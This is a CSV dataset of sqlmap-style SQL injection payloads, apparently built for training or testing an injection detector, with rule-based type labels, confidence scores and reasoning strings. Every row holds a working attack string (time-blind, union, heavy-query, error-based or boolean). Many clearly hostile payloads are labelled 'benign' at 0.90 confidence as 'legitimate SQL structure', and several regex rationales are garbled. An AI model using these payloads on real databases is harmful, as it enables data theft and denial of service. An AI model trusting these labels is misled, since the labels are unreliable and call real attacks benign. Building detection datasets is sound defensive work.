id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
24944,"1' ) ) ) or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",heavy_query,db2,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
24945,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( 'afdy' like 'afdy",time_blind,sqlite,0.85,Signal match: randomblob → time_blind (P5); DB signature: sqlite,1
24946,"1' ) ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ( 'kufi' = 'kufi",error_based,generic,0.85,Signal match: extractvalue → error_based (P4); confidence: 0.85,1
24947,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and 'gpeo' like 'gpeo",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
24948,"1' ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24949,"1"" ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ""otgh"" like ""otgh",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24950,"1"" where 2394 = 2394 and 8831 = 8333--",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24951,"-3090"" or make_set ( 9354 = 9354,7185 ) and ""qowe"" like ""qowe",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24952,"1"" ) ) as vgsb where 4747 = 4747",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24953,"1' in boolean mode ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) #",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24954,"1'|| ( select 'oxam' from dual where 7162 = 7162 and make_set ( 8403 = 8403,8899 ) ) ||'",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24955,-5067' ) ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( 'vkab' like 'vkab,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24956,"1' in boolean mode ) and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
24957,1'+ ( select hkrg where 3665 = 3665,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24958,"-5431"" ) ) ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( ""ipmo"" = ""ipmo",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24959,1' ) rlike ( select ( case when ( 9308 = 2540 ) then 1 else 0x28 end ) ) and ( 'rghd' = 'rghd,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24960,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and '%' = '",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
24961,select ( case when ( 9907 = 2736 ) then 9907 else 9907* ( select 9907 from mysql.db ) end ) #,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24962,end and ( ( 2160 = 2160,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24963,"-2855"" ) ) ) union all select 1496,1496,1496,1496#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24964,"-8544%"" or 6872 = 6872 and ""%"" = """,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24965,"1%' and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and '%' = '",heavy_query,db2,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
24966,"-8703' ) where 9723 = 9723 union all select 9723,9723,9723,9723,9723#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24967,"1"" or sleep ( 5 ) #",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
24968,1' ) ) ) waitfor delay '0:0:5'--,time_blind,mssql,0.85,Signal match: waitfor delay → time_blind (P5); DB signature: mssql,1
24969,"1"" ) ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ( ""umfr"" like ""umfr",time_blind,postgresql,0.85,Signal match: sleep → time_blind (P5); DB signature: postgresql,1
24970,-8809'|| ( select 'hyzr' where 5694 = 5694 union all select 5694--,union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24971,-3107' ) where 7782 = 7782 or 8571 = 8571--,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24972,"1"" ) where 4878 = 4878 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) --",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
24973,1' and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and 'lvyw' = 'lvyw,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24974,"-6263"" union all select 8005,8005#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24975,"1' and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) )",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24976,"1' or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24977,"-8793' where 3853 = 3853 union all select 3853,3853,3853,3853,3853,3853,3853,3853#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24978,"1"" ) where 9962 = 9962 and 4595 = 4595#",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24979,"1"" ) ) ) union all select null,null,null,null,null,null,null,null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24980,1 ) as mtnw where 7293 = 7293 and 2603 = 5764--,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24981,"-9082 union all select 9858,9858,9858,9858,9858,9858--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24982,"1"" or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ""snht"" = ""snht",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
24983,"-9884' ) or elt ( 1942 = 8409,8409 ) and ( 'tqdq' like 'tqdq",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24984,"1%"" union all select null,null,null,null,null,null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24985,"-9587 union all select 1568,1568,1568,1568,1568,1568#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
